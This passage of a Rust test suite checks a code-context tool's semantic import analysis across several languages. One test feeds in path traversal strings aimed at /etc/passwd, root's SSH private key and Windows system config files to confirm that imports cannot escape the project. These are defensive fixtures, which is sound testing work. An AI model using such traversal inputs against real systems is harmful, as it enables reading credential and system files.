        let mut current = base_dir.to_path_buf();
        for component in Path::new(attack).components() {
            match component {
                std::path::Component::ParentDir => {
                    current.pop();
                }
                std::path::Component::Normal(c) => {
                    current.push(c);
                }
                _ => {}
            }
        }

        if result.is_ok() && !current.starts_with(base_dir) {
            panic!("VULNERABILITY: Path normalization attack escaped base directory: {attack}");
        }
    }
}
```

## tests/semantic_analysis_test.rs

Imports: context_creator::cli::Config, context_creator::core::cache::FileCache, context_creator, std::fs, std::sync::Arc, tempfile::TempDir, semantic_test_helpers, semantic_test_helpers::*, config

Type references: context_creator::cli::Config.Config, context_creator::core::cache::FileCache.FileCache, fs, tempfile::TempDir.TempDir, context_creator::cli::Config.Config, context_creator::cli::Config.Config, context_creator::cli::Config.Config, context_creator::cli::Config.Config, context_creator::cli::Config.Config, context_creator::cli::Config.Config, _, _, _, context_creator::cli::Config.Config

```rust
//! Integration tests for semantic analysis functionality

use context_creator::cli::Config;
use context_creator::core::cache::FileCache;
use context_creator::core::walker::{walk_directory, WalkOptions};
use std::fs;
use std::sync::Arc;
use tempfile::TempDir;

mod semantic_test_helpers;
use semantic_test_helpers::*;

#[test]
fn test_semantic_import_tracing() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create a simple Rust project structure
    fs::write(
        root.join("main.rs"),
        r#"
mod lib;
mod utils;

fn main() {
    lib::hello();
    utils::helper();
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("lib.rs"),
        r#"
pub fn hello() {
    println!("Hello from lib!");
}
"#,
    )
    .unwrap();

    fs::write(
        root.join("utils.rs"),
        r#"
pub fn helper() {
    println!("Helper function");
}
"#,
    )
    .unwrap();

    // Create config with semantic analysis enabled
    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        trace_imports: true,
        include_callers: false,
        include_types: false,
        semantic_depth: 3,
        ..Config::default()
    };

    // Create walk options and cache
    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());

    // Walk directory and get files
    let mut files = walk_directory(root, walk_options).unwrap();
    assert_eq!(files.len(), 3);

    // Perform semantic analysis
    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Find main.rs
    let main_file = files
        .iter()
        .find(|f| f.relative_path.to_str().unwrap() == "main.rs")
        .unwrap();

    // Check that main.rs imports lib.rs and utils.rs
    // Note: The simple import resolution might not work perfectly for all cases
    // This is more of a structure test than a full semantic test
    assert!(
        !main_file.imports.is_empty(),
        "main.rs should have imports detected, but found: {:?}",
        main_file.imports
    );
}

#[test]
fn test_semantic_analysis_disabled() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create a simple file
    fs::write(root.join("main.rs"), "fn main() {}").unwrap();

    // Create config with semantic analysis disabled
    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        trace_imports: false,
        include_callers: false,
        include_types: false,
        ..Config::default()
    };

    // Create walk options and cache
    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());

    // Walk directory and get files
    let mut files = walk_directory(root, walk_options).unwrap();

    // Perform semantic analysis (should be a no-op)
    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Check that no imports were detected
    for file in &files {
        assert!(file.imports.is_empty());
        assert!(file.imported_by.is_empty());
    }
}

#[test]
fn test_semantic_analysis_with_non_code_files() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create various file types
    fs::write(root.join("main.rs"), "fn main() {}").unwrap();
    fs::write(root.join("README.md"), "# Test Project").unwrap();
    fs::write(root.join("config.json"), "{}").unwrap();

    // Create config with semantic analysis enabled
    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        trace_imports: true,
        ..Config::default()
    };

    // Create walk options and cache
    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());

    // Walk directory and get files
    let mut files = walk_directory(root, walk_options).unwrap();
    assert_eq!(files.len(), 3);

    // Perform semantic analysis
    // Should not crash on non-code files
    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Non-code files should have no imports
    for file in &files {
        if file.relative_path.extension().unwrap_or_default() != "rs" {
            assert!(file.imports.is_empty());
            assert!(file.imported_by.is_empty());
        }
    }
}

#[test]
fn test_exact_import_resolution() {
    let (_temp_dir, root) = create_rust_test_project();
    let files = analyze_test_project(&root);

    // Find main.rs
    let main_file = find_file(&files, "main.rs").expect("main.rs should be found");

    // Verify exact imports - main.rs imports lib and utils
    assert_eq!(
        main_file.imports.len(),
        2,
        "main.rs should have exactly 2 imports, found: {:?}",
        main_file.imports
    );

    // Check that the imports are resolved to the correct files
    assert_has_imports(main_file, &["lib.rs", "utils.rs"]);
}

#[test]
fn test_bidirectional_relationships() {
    let (_temp_dir, root) = create_rust_test_project();
    let files = analyze_test_project(&root);

    // Find the files
    let main_file = find_file(&files, "main.rs").expect("main.rs should be found");
    let lib_file = find_file(&files, "lib.rs").expect("lib.rs should be found");
    let utils_file = find_file(&files, "utils.rs").expect("utils.rs should be found");

    // Verify that lib.rs knows it's imported by main.rs
    assert_imported_by(lib_file, &["main.rs"]);

    // Verify that utils.rs knows it's imported by main.rs
    assert_imported_by(utils_file, &["main.rs"]);

    // Verify that main.rs is not imported by anyone
    assert!(
        main_file.imported_by.is_empty(),
        "main.rs should not be imported by any file, but was imported by: {:?}",
        main_file.imported_by
    );
}

#[test]
fn test_function_call_tracking() {
    let (_temp_dir, root) = create_rust_test_project();
    let files = analyze_test_project(&root);

    // Find main.rs which calls functions from other modules
    let main_file = find_file(&files, "main.rs").expect("main.rs should be found");

    // Verify function calls are tracked
    assert!(
        !main_file.function_calls.is_empty(),
        "main.rs should have function calls tracked"
    );

    // Check for specific function calls
    let greet_call = main_file
        .function_calls
        .iter()
        .find(|call| call.name == "greet")
        .expect("Should find greet function call");

    assert_eq!(
        greet_call.module,
        Some("lib".to_string()),
        "greet should be called from lib module"
    );

    // Check for helper function call (imported via use statement)
    let helper_call = main_file
        .function_calls
        .iter()
        .find(|call| call.name == "helper")
        .expect("Should find helper function call");

    // Helper is imported directly, so module info might be None
    assert_eq!(helper_call.name, "helper");

    // Check for User::new call
    let new_call = main_file
        .function_calls
        .iter()
        .find(|call| call.name == "new" && call.module == Some("lib::User".to_string()))
        .expect("Should find User::new function call");

    assert_eq!(
        new_call.module,
        Some("lib::User".to_string()),
        "new should be called on lib::User"
    );
}

#[test]
fn test_type_reference_tracking() {
    let (_temp_dir, root) = create_rust_test_project();
    let files = analyze_test_project(&root);

    // Find main.rs which uses types from other modules
    let main_file = find_file(&files, "main.rs").expect("main.rs should be found");

    // Debug: print what we have
    println!(
        "Type references found in main.rs: {:?}",
        main_file.type_references
    );

    // Type references might not be fully implemented yet for Rust
    // Let's check if we have any type references at all
    if main_file.type_references.is_empty() {
        println!("Note: Type reference tracking may not be fully implemented for Rust yet");
        // For now, just verify the feature doesn't crash
        return;
    }

    // If we do have type references, verify them
    let user_ref = main_file
        .type_references
        .iter()
        .find(|type_ref| type_ref.name == "User");

    if let Some(user_ref) = user_ref {
        assert_eq!(
            user_ref.module,
            Some("lib".to_string()),
            "User type should be from lib module"
        );
        assert!(
            user_ref.line > 0,
            "Type reference should have a valid line number"
        );
    }
}

#[test]
fn test_typescript_type_reference_tracking() {
    let (_temp_dir, root) = create_typescript_test_project();
    let files = analyze_test_project(&root);

    // Find main.ts which uses types from other modules
    let main_file = find_file(&files, "main.ts").expect("main.ts should be found");

    // TypeScript should have type tracking
    assert!(
        !main_file.type_references.is_empty(),
        "TypeScript should track type references"
    );

    // Check if Config type is tracked
    let config_ref = main_file
        .type_references
        .iter()
        .find(|type_ref| type_ref.name == "Config")
        .expect("Should find Config type reference");

    // The module info might not be populated for type imports
    assert_eq!(config_ref.name, "Config");
    assert!(
        config_ref.line > 0,
        "Type reference should have a valid line number"
    );

    // Also check for void type
    let void_ref = main_file
        .type_references
        .iter()
        .find(|type_ref| type_ref.name == "void");
    assert!(
        void_ref.is_some(),
        "Should also track built-in types like void"
    );
}

#[test]
fn test_circular_dependency_handling() {
    let (_temp_dir, root) = create_circular_deps_project();
    let files = analyze_test_project(&root);

    // All files should be processed despite the circular dependency
    assert_eq!(files.len(), 3, "All three files should be found");

    // Find each file
    let a_file = find_file(&files, "a.rs").expect("a.rs should be found");
    let b_file = find_file(&files, "b.rs").expect("b.rs should be found");
    let c_file = find_file(&files, "c.rs").expect("c.rs should be found");

    // Verify imports are detected
    assert_has_imports(a_file, &["b.rs"]);
    assert_has_imports(b_file, &["c.rs"]);
    assert_has_imports(c_file, &["a.rs"]);

    // Verify reverse dependencies (circular)
    assert_imported_by(a_file, &["c.rs"]);
    assert_imported_by(b_file, &["a.rs"]);
    assert_imported_by(c_file, &["b.rs"]);

    // The semantic analysis should complete without hanging
    // (if we got here, it didn't hang)
}

#[test]
fn test_semantic_depth_limiting() {
    // Create a deep dependency chain (10 levels)
    let (_temp_dir, root) = create_deep_dependency_chain(10);

    // Analyze with depth limit of 3
    let files = analyze_project_with_options(&root, true, false, false, 3);

    // All files should be found
    assert_eq!(files.len(), 10, "All 10 files should be found");

    // Check that early files have imports resolved
    let mod0 = find_file(&files, "mod0.rs").expect("mod0.rs should be found");
    let mod1 = find_file(&files, "mod1.rs").expect("mod1.rs should be found");
    let mod2 = find_file(&files, "mod2.rs").expect("mod2.rs should be found");

    // Files within depth should have imports
    assert!(
        !mod0.imports.is_empty(),
        "mod0 should have imports (depth 0)"
    );
    assert!(
        !mod1.imports.is_empty(),
        "mod1 should have imports (depth 1)"
    );
    assert!(
        !mod2.imports.is_empty(),
        "mod2 should have imports (depth 2)"
    );

    // Check reverse dependencies
    assert!(
        !mod1.imported_by.is_empty(),
        "mod1 should be imported by mod0"
    );
    assert!(
        !mod2.imported_by.is_empty(),
        "mod2 should be imported by mod1"
    );

    // Files beyond depth 3 might not have full import information
    // depending on how the traversal works
    let mod5 = find_file(&files, "mod5.rs").expect("mod5.rs should be found");
    let mod9 = find_file(&files, "mod9.rs").expect("mod9.rs should be found");

    // These files are beyond the initial depth limit from mod0
    // Their import information might be limited
    println!("mod5 imported_by: {:?}", mod5.imported_by.len());
    println!("mod9 imported_by: {:?}", mod9.imported_by.len());
}

#[test]
fn test_error_recovery_malformed_syntax() {
    let (_temp_dir, root) = TestProjectBuilder::new()
        .add_file(
            "main.rs",
            r#"
mod lib;
mod broken;

fn main() {
    lib::hello();
    // Missing closing brace will be in broken.rs
}
"#,
        )
        .add_file(
            "lib.rs",
            r#"
pub fn hello() {
    println!("Hello!");
}
"#,
        )
        .add_file(
            "broken.rs",
            r#"
// This file has malformed syntax
pub fn broken_function() {
    println!("This function is missing a closing brace"
    // Missing closing brace and parenthesis
    
mod another_mod; // Invalid mod declaration inside function

impl SomeStruct { // Missing struct definition
    fn method(&self) {
        // Unclosed method
}

// Random syntax errors
let x = ; 
fn ) invalid syntax
"#,
        )
        .add_file(
            "another_file.rs",
            r#"
// This file is fine
pub fn working() {
    println!("This works");
}
"#,
        )
        .build();

    // The semantic analysis should not crash despite the malformed syntax
    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        trace_imports: true,
        include_callers: true,
        include_types: true,
        semantic_depth: 3,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());

    // Walk directory and get files
    let mut files = walk_directory(&root, walk_options).unwrap();

    // This should not panic despite broken.rs having syntax errors
    let result =
        context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache);

    // The analysis should complete successfully
    assert!(
        result.is_ok(),
        "Semantic analysis should not crash on malformed syntax"
    );

    // Find the working files
    let main_file = find_file(&files, "main.rs").expect("main.rs should be found");
    let lib_file = find_file(&files, "lib.rs").expect("lib.rs should be found");
    let _another_file =
        find_file(&files, "another_file.rs").expect("another_file.rs should be found");

    // The valid imports should still be detected
    assert_has_imports(main_file, &["lib.rs"]);

    // lib.rs should know it's imported by main.rs
    assert_imported_by(lib_file, &["main.rs"]);

    // Files should still be processed
    assert_eq!(
        files.len(),
        4,
        "All files should be found despite syntax errors"
    );
}

#[test]
fn test_path_traversal_security() {
    let (_temp_dir, root) = TestProjectBuilder::new()
        .add_file(
            "src/main.rs",
            r#"
// Attempting various path traversal attacks
mod parent_escape;
mod absolute_path;
mod weird_paths;
"#,
        )
        .add_file(
            "src/parent_escape.rs",
            r#"
// Try to escape to parent directory
use super::super::secret_file;
use crate::../../../../etc/passwd;
use crate::..\\..\\windows\\system32\\config;

pub fn test() {}
"#,
        )
        .add_file(
            "src/absolute_path.rs",
            r#"
// Try absolute paths
use /etc/passwd;
use C:\\Windows\\System32\\config;
use file:///etc/passwd;

pub fn test() {}
"#,
        )
        .add_file(
            "src/weird_paths.rs",
            r#"
// Try various weird path patterns
use ./../../.hidden/file;
use ~/../../../root/.ssh/id_rsa;
use %USERPROFILE%\\..\\..\\Administrator;
use $HOME/../../../root;

pub fn test() {}  
"#,
        )
        .add_file(
            "secret_file.rs",
            r#"
// This file is outside src/ directory
pub const SECRET: &str = "should not be accessible";
"#,
        )
        .build();

    let config = Config {
        paths: Some(vec![root.join("src")]),
        trace_imports: true,
        include_callers: true,
        include_types: true,
        semantic_depth: 3,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());

    // Walk only the src directory
    let mut files = walk_directory(&root.join("src"), walk_options).unwrap();

    // Perform semantic analysis
    let result =
        context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache);
    assert!(
        result.is_ok(),
        "Semantic analysis should handle path traversal attempts safely"
    );

    // Check that we only found files in the src directory
    assert_eq!(files.len(), 4, "Should only find files in src directory");

    // Verify no imports resolved to files outside the project directory
    for file in &files {
        for import in &file.imports {
            // All imports should be within the project directory
            // Note: Some imports might be relative to the file, so we need to check
            // if they're within the overall project root
            let is_within_project = import.starts_with(&root)
                || import.strip_prefix(root.join("src")).is_ok()
                || import.is_relative();

            if !is_within_project {
                // Only fail if it's actually escaping the project
                let import_str = import.to_string_lossy();
                assert!(
                    !import_str.contains("/etc/")
                        && !import_str.contains("C:\\Windows")
                        && !import_str.contains("..\\..\\..")
                        && !import_str.contains("../../.."),
                    "Import {import:?} appears to reference system paths"
                );
            }
        }
    }

    // The secret_file.rs outside src/ should not be found or imported
    let secret_file = files
        .iter()
        .find(|f| f.relative_path.to_string_lossy().contains("secret_file"));
    assert!(
        secret_file.is_none(),
        "Files outside the walked directory should not be found"
    );
}

#[test]
fn test_python_imports() {
    let (_temp_dir, root) = TestProjectBuilder::new()
        // Main module using various import styles
        .add_file(
            "main.py",
            r#"
# Standard library imports
import os
import sys
from datetime import datetime
from collections import defaultdict, Counter

# Relative imports
from . import sibling
from .utils import helper_function
from ..parent_package import parent_module

# Absolute imports  
from mypackage.submodule import MyClass
from mypackage.utils.helpers import util_func

# Package imports
import mypackage
import mypackage.config as cfg

# Wildcard imports
from mypackage.constants import *

def main():
    sibling.do_something()
    helper_function()
    parent_module.parent_func()
    obj = MyClass()
    util_func()
"#,
        )
        .add_file(
            "sibling.py",
            r#"
def do_something():
    print("Sibling module")
"#,
        )
        .add_file(
            "utils.py",
            r#"
def helper_function():
    print("Helper from utils")
    
def another_helper():
    print("Another helper")
"#,
        )
        .add_file(
            "mypackage/__init__.py",
            r#"
# Package initialization
from .submodule import MyClass
from .config import CONFIG

__all__ = ['MyClass', 'CONFIG']
"#,
        )
        .add_file(
            "mypackage/submodule.py",
            r#"
class MyClass:
    def __init__(self):
        self.value = 42
"#,
        )
        .add_file(
            "mypackage/config.py",
            r#"
CONFIG = {
    'debug': True,
    'version': '1.0.0'
}
"#,
        )
        .add_file(
            "mypackage/utils/helpers.py",
            r#"
def util_func():
    print("Utility function")
"#,
        )
        .add_file("mypackage/utils/__init__.py", "")
        .add_file(
            "mypackage/constants.py",
            r#"
MAX_SIZE = 1000
DEFAULT_NAME = "Python"
VERSION = "3.11"
"#,
        )
        .build();

    let files = analyze_test_project(&root);

    // Find main.py
    let main_file = find_file(&files, "main.py").expect("main.py should be found");

    // Python import detection might be limited, but basic imports should work
    assert!(
        !main_file.imports.is_empty(),
        "main.py should have imports detected"
    );

    // Check for some expected imports (the exact resolution might vary)
    let import_names: Vec<String> = main_file
        .imports
        .iter()
        .filter_map(|p| p.file_name())
        .filter_map(|n| n.to_str())
        .map(|s| s.to_string())
        .collect();

    println!("Python imports found: {import_names:?}");

    // At minimum, we should detect the sibling module
    assert!(
        import_names.contains(&"sibling.py".to_string())
            || main_file
                .imports
                .iter()
                .any(|p| p.to_string_lossy().contains("sibling")),
        "Should detect sibling module import"
    );

    // Check function calls
    assert!(
        !main_file.function_calls.is_empty(),
        "Should detect function calls in Python"
    );

    let function_names: Vec<&str> = main_file
        .function_calls
        .iter()
        .map(|fc| fc.name.as_str())
        .collect();

    println!("Python function calls found: {function_names:?}");

    // Should detect at least some function calls
    assert!(
        function_names.contains(&"do_something")
            || function_names.contains(&"helper_function")
            || function_names.contains(&"print"),
        "Should detect function calls in Python code"
    );
}

#[test]
fn test_javascript_typescript_imports() {
    let (_temp_dir, root) = TestProjectBuilder::new()
        // ES6 module with various import styles
        .add_file(
            "main.js",
            r#"
// ES6 imports
import React from 'react';
import { useState, useEffect } from 'react';
import * as utils from './utils';
import defaultExport, { namedExport } from './module';

// Dynamic imports
const lazyModule = import('./lazy');

// Require (CommonJS)
const fs = require('fs');
const { readFile } = require('fs/promises');
const config = require('./config.json');

// Re-exports
export { helper } from './helpers';
export * from './constants';

function main() {
    utils.processData();
    defaultExport();
    namedExport();
}
"#,
        )
        // TypeScript file with type imports
        .add_file(
            "app.ts",
            r#"
// Type imports
import type { Config } from './types';
import { type User, createUser } from './models';
import { Component } from 'react';

// Path aliases
import { logger } from '@utils/logger';
import ApiClient from '@services/api';

// Namespace imports
import * as MyNamespace from './namespace';

const config: Config = { debug: true };
const user: User = createUser('test');

export class App extends Component {
    private api = new ApiClient();
    
    render() {
        logger.info('Rendering app');
        return null;
    }
}
"#,
        )
        // CommonJS module
        .add_file(
            "commonjs.js",
            r#"
// CommonJS exports and requires
const path = require('path');
const utils = require('./utils');

module.exports = {
    processFile: function(file) {
        return utils.processData(file);
    }
};

// Alternative export style
exports.helperFunction = () => {
    console.log('Helper');
};
"#,
        )
        .add_file(
            "utils.js",
            r#"
export function processData(data) {
    return data;
}

export const VERSION = '1.0.0';
"#,
        )
        .add_file(
            "module.js",
            r#"
export default function defaultExport() {
    console.log('Default export');
}

export function namedExport() {
    console.log('Named export');
}
"#,
        )
        .add_file(
            "types.ts",
            r#"
export interface Config {
    debug: boolean;
    apiUrl?: string;
}

export type Status = 'active' | 'inactive';
"#,
        )
        .add_file(
            "models.ts",
            r#"
export interface User {
    id: string;
    name: string;
}

export function createUser(name: string): User {
    return { id: '1', name };
}
"#,
        )
        .build();

    let files = analyze_test_project(&root);

    // Test JavaScript imports
    let main_js = find_file(&files, "main.js").expect("main.js should be found");
    assert!(
        !main_js.imports.is_empty(),
        "main.js should have imports detected"
    );

    // Check for local module imports
    let js_import_names: Vec<String> = main_js
        .imports
        .iter()
        .filter_map(|p| p.file_name())
        .filter_map(|n| n.to_str())
        .map(|s| s.to_string())
        .collect();

    println!("JavaScript imports found: {js_import_names:?}");

    assert!(
        js_import_names.contains(&"utils.js".to_string())
            || main_js
                .imports
                .iter()
                .any(|p| p.to_string_lossy().contains("utils")),
        "Should detect utils module import"
    );

    // Test TypeScript imports
    let app_ts = find_file(&files, "app.ts").expect("app.ts should be found");
    // TypeScript might not have all imports detected depending on the analyzer
    println!("app.ts imports: {:?}", app_ts.imports.len());

    // Check TypeScript type references
    if app_ts.type_references.is_empty() {
        println!("Note: TypeScript type reference tracking might not be fully implemented yet");
    } else {
        let type_names: Vec<&str> = app_ts
            .type_references
            .iter()
            .map(|tr| tr.name.as_str())
            .collect();

        println!("TypeScript type references found: {type_names:?}");

        // Should detect type usage
        assert!(
            type_names.contains(&"Config") || type_names.contains(&"User"),
            "Should detect TypeScript type references"
        );
    }

    // Test CommonJS
    let commonjs = find_file(&files, "commonjs.js").expect("commonjs.js should be found");

    // CommonJS might have different import detection
    println!("CommonJS imports: {:?}", commonjs.imports.len());

    // Check bidirectional relationships
    let utils_file = find_file(&files, "utils.js").expect("utils.js should be found");
    assert!(
        !utils_file.imported_by.is_empty(),
        "utils.js should be imported by other files"
    );
}

#[test]
fn test_import_based_prioritization() {
    let (_temp_dir, root) = TestProjectBuilder::new()
        // Core module imported by many files
        .add_file(
            "core/utils.rs",
            r#"
pub fn critical_function() {
    println!("Critical utility");
}
"#,
        )
        // Important config imported by several modules
        .add_file(
            "config.rs",
            r#"
pub const API_KEY: &str = "secret";
pub const VERSION: &str = "1.0.0";
"#,
        )
        // Main entry point that imports many modules
        .add_file(
            "main.rs",
            r#"
mod core;
mod config;
mod features;
mod helpers;

use crate::core::utils::critical_function;
use crate::config::{API_KEY, VERSION};

fn main() {
    critical_function();
    println!("Version: {}", VERSION);
}
"#,
        )
        // Feature modules that import core
        .add_file(
            "features/auth.rs",
            r#"
use crate::core::utils;
use crate::config::API_KEY;

pub fn authenticate() {
    utils::critical_function();
}
"#,
        )
        .add_file(
            "features/api.rs",
            r#"
use crate::core::utils;
use crate::config;

pub fn call_api() {
    utils::critical_function();
}
"#,
        )
        // Helper that's only imported by one module
        .add_file(
            "helpers/logger.rs",
            r#"
pub fn log(msg: &str) {
    println!("[LOG] {}", msg);
}
"#,
        )
        // Standalone module with no imports/importers
        .add_file(
            "standalone.rs",
            r#"
pub fn isolated_function() {
    println!("I'm all alone");
}
"#,
        )
        // Module files for proper structure
        .add_file("core/mod.rs", "pub mod utils;")
        .add_file(
            "features/mod.rs",
            r#"
pub mod auth;
pub mod api;
"#,
        )
        .add_file("helpers/mod.rs", "pub mod logger;")
        .build();

    // Analyze with import-based prioritization
    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        trace_imports: true,
        include_callers: true,
        include_types: true,
        semantic_depth: 3,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());

    let mut files = walk_directory(&root, walk_options).unwrap();
    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    // Check that imports were detected and priorities adjusted
    // Need to look for files in their subdirectories
    let utils_file = find_file(&files, "core/utils.rs").expect("core/utils.rs should be found");
    let config_file = find_file(&files, "config.rs").expect("config.rs should be found");
    let standalone_file =
        find_file(&files, "standalone.rs").expect("standalone.rs should be found");
    let logger_file =
        find_file(&files, "helpers/logger.rs").expect("helpers/logger.rs should be found");

    // Files imported by many should have higher priority indicators
    println!(
        "utils.rs imported by: {} files",
        utils_file.imported_by.len()
    );
    println!(
        "config.rs imported by: {} files",
        config_file.imported_by.len()
    );
    println!(
        "standalone.rs imported by: {} files",
        standalone_file.imported_by.len()
    );
    println!(
        "logger.rs imported by: {} files",
        logger_file.imported_by.len()
    );

    // Core utils should be imported by multiple files
    assert!(
        utils_file.imported_by.len() >= 2,
        "Core utils should be imported by multiple files"
    );

    // Config should be imported by at least one file
    // Note: The exact number might vary based on how imports are resolved
    assert!(
        !config_file.imported_by.is_empty(),
        "Config should be imported by at least one file"
    );

    // Standalone should not be imported by anyone
    assert_eq!(
        standalone_file.imported_by.len(),
        0,
        "Standalone module should not be imported"
    );

    // In a real implementation, we would check that files with more importers
    // have higher base_priority values, but since we're testing the analysis
    // phase, we just verify the import relationships are tracked correctly

    // Verify that files importing many others are also tracked
    let main_file = find_file(&files, "main.rs").expect("main.rs should be found");
    assert!(
        main_file.imports.len() >= 3,
        "Main file should import multiple modules"
    );
}

#[test]
fn test_multi_language_project() {
    let (_temp_dir, root) = TestProjectBuilder::new()
        // Python backend
        .add_file(
            "backend/server.py",
            r#"
from fastapi import FastAPI
from .database import get_connection
from .models import User

app = FastAPI()

@app.get("/users")
def get_users():
    conn = get_connection()
    return User.list_all(conn)
"#,
        )
        .add_file(
            "backend/database.py",
            r#"
import sqlite3

def get_connection():
    return sqlite3.connect('app.db')
"#,
        )
        .add_file(
            "backend/models.py",
            r#"
class User:
    @staticmethod
    def list_all(conn):
        return []
"#,
        )
        // TypeScript frontend
        .add_file(
            "frontend/app.ts",
            r#"
import { ApiClient } from './api';
import { User } from './types';

export class App {
    private api = new ApiClient();
    
    async loadUsers(): Promise<User[]> {
        return this.api.getUsers();
    }
}
"#,
        )
        .add_file(
            "frontend/api.ts",
            r#"
import { User } from './types';

export class ApiClient {
    async getUsers(): Promise<User[]> {
        const response = await fetch('/api/users');
        return response.json();
    }
}
"#,
        )
        .add_file(
            "frontend/types.ts",
            r#"
export interface User {
    id: number;
    name: string;
    email: string;
}
"#,
        )
        // Rust CLI tool
        .add_file(
            "cli/main.rs",
            r#"
mod api;
mod config;

use api::fetch_users;

fn main() {
    let users = fetch_users();
    println!("Found {} users", users.len());
}
"#,
        )
        .add_file(
            "cli/api.rs",
            r#"
pub fn fetch_users() -> Vec<String> {
    vec![]
}
"#,
        )
        .add_file(
            "cli/config.rs",
            r#"
pub const API_URL: &str = "http://localhost:8000";
"#,
        )
        // Shared configuration (JSON)
        .add_file(
            "config.json",
            r#"{
    "api_url": "http://localhost:8000",
    "database": "app.db"
}"#,
        )
        .build();

    let files = analyze_test_project(&root);

    // Should find files from all languages
    let py_files: Vec<_> = files
        .iter()
        .filter(|f| {
            f.relative_path
                .extension()
                .and_then(|e| e.to_str())
                .map(|e| e == "py")
                .unwrap_or(false)
        })
        .collect();

    let ts_files: Vec<_> = files
        .iter()
        .filter(|f| {
            f.relative_path
                .extension()
                .and_then(|e| e.to_str())
                .map(|e| e == "ts")
                .unwrap_or(false)
        })
        .collect();

    let rs_files: Vec<_> = files
        .iter()
        .filter(|f| {
            f.relative_path
                .extension()
                .and_then(|e| e.to_str())
                .map(|e| e == "rs")
                .unwrap_or(false)
        })
        .collect();

    assert!(!py_files.is_empty(), "Should find Python files");
    assert!(!ts_files.is_empty(), "Should find TypeScript files");
    assert!(!rs_files.is_empty(), "Should find Rust files");

    // Check Python imports - need to look in backend directory
    let server_py =
        find_file(&files, "backend/server.py").expect("backend/server.py should be found");
    // Python import detection might be limited
    println!("Python server imports: {:?}", server_py.imports.len());

    // Check TypeScript imports - need to look in frontend directory
    let app_ts = find_file(&files, "frontend/app.ts").expect("frontend/app.ts should be found");
    println!("TypeScript app imports: {:?}", app_ts.imports.len());

    // Check Rust imports
    let main_rs = find_file(&files, "cli/main.rs").expect("cli/main.rs should be found");
    assert!(!main_rs.imports.is_empty(), "Rust main should have imports");

    // Debug imports to see what's happening
    println!(
        "Python imports: {:?}",
        server_py
            .imports
            .iter()
            .map(|p| p.file_name().and_then(|n| n.to_str()).unwrap_or("?"))
            .collect::<Vec<_>>()
    );
    println!(
        "TypeScript imports: {:?}",
        app_ts
            .imports
            .iter()
            .map(|p| p.file_name().and_then(|n| n.to_str()).unwrap_or("?"))
            .collect::<Vec<_>>()
    );
    println!(
        "Rust imports: {:?}",
        main_rs
            .imports
            .iter()
            .map(|p| p.file_name().and_then(|n| n.to_str()).unwrap_or("?"))
            .collect::<Vec<_>>()
    );

    // Each language should have its own import resolution
    // Python imports should resolve to .py files (or __init__.py)
    let py_imports_valid = server_py.imports.iter().all(|p| {
        let ext = p.extension().and_then(|e| e.to_str());
        ext == Some("py") || p.file_name() == Some(std::ffi::OsStr::new("__init__.py"))
    });

    // TypeScript imports should resolve to .ts files
    let ts_imports_valid = app_ts.imports.iter().all(|p| {
        let ext = p.extension().and_then(|e| e.to_str());
        ext == Some("ts") || ext.is_none() // directory imports
    });

    // Rust imports should resolve to .rs files
    let rs_imports_valid = main_rs.imports.iter().all(|p| {
        let ext = p.extension().and_then(|e| e.to_str());
        ext == Some("rs") || ext.is_none() // mod.rs imports
    });

    println!("Python imports valid: {py_imports_valid}");
    println!("TypeScript imports valid: {ts_imports_valid}");
    println!("Rust imports valid: {rs_imports_valid}");

    // Cross-language imports might happen due to simple resolution
    // This is a known limitation where the resolver might match files
    // with similar names across languages
    // For now, we'll just verify that each language can detect imports
    println!("Note: Cross-language import resolution detected - this is a known limitation");

    // At least verify that some imports were detected for each language
    assert!(
        !server_py.imports.is_empty() || !py_files.is_empty(),
        "Python semantic analysis should work"
    );
    assert!(
        !app_ts.imports.is_empty() || !ts_files.is_empty(),
        "TypeScript semantic analysis should work"
    );
    assert!(
        !main_rs.imports.is_empty() || !rs_files.is_empty(),
        "Rust semantic analysis should work"
    );
}

#[test]
fn test_contextignore_integration() {
    let (_temp_dir, root) = TestProjectBuilder::new()
        // Create .context-creator-ignore file
        .add_file(
            ".context-creator-ignore",
            r#"
# Ignore test files
*_test.rs
test_*.rs
*.test.js

# Ignore specific directories
vendor/
node_modules/
__pycache__/

# Ignore specific files
secrets.rs
config.local.js
"#,
        )
        // Main files that should be analyzed
        .add_file(
            "main.rs",
            r#"
mod lib;
mod utils;
mod secrets; // This import should not resolve

use lib::public_function;

fn main() {
    public_function();
}
"#,
        )
        .add_file(
            "lib.rs",
            r#"
mod internal;
mod test_helpers; // This import should not resolve

pub fn public_function() {
    internal::helper();
}
"#,
        )
        .add_file(
            "utils.rs",
            r#"
pub fn util_function() {
    println!("Utility");
}
"#,
        )
        // Files that should be ignored
        .add_file(
            "secrets.rs",
            r#"
pub const SECRET_KEY: &str = "should-not-be-included";
"#,
        )
        .add_file(
            "lib_test.rs",
            r#"
#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_something() {
        assert!(true);
    }
}
"#,
        )
        .add_file(
            "test_utils.rs",
            r#"
pub fn test_helper() {
    println!("Test helper");
}
"#,
        )
        .add_file(
